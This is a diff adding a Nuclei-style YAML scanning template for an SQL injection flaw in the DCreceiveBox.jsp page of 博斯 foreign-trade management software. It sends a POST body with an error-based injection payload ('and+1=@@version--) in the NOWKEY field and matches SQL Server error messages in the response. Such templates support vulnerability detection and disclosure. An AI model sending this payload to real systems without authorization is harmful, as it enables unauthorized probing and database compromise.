@@ -1,0 +1,29 @@
+id: poc-yaml-51boss-dcreceivebox-jsp-sqli
+info:
+  name: 博斯外贸管理软件 DCreceiveBox.jsp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/crm/module/DCreceiveBox.jsp"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: |
+      SAVE=1&setCustom=&NOWKEY='and+1=@@version--
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "java.sql.SQLException"
+          - "Microsoft SQL Server"
+        part: body
+      - type: regex
+        regex:
+          - "转换为数据类型为"
+        part: body
+      - type: regex
+        regex:
+          - "发生语法错误"
+        part: body
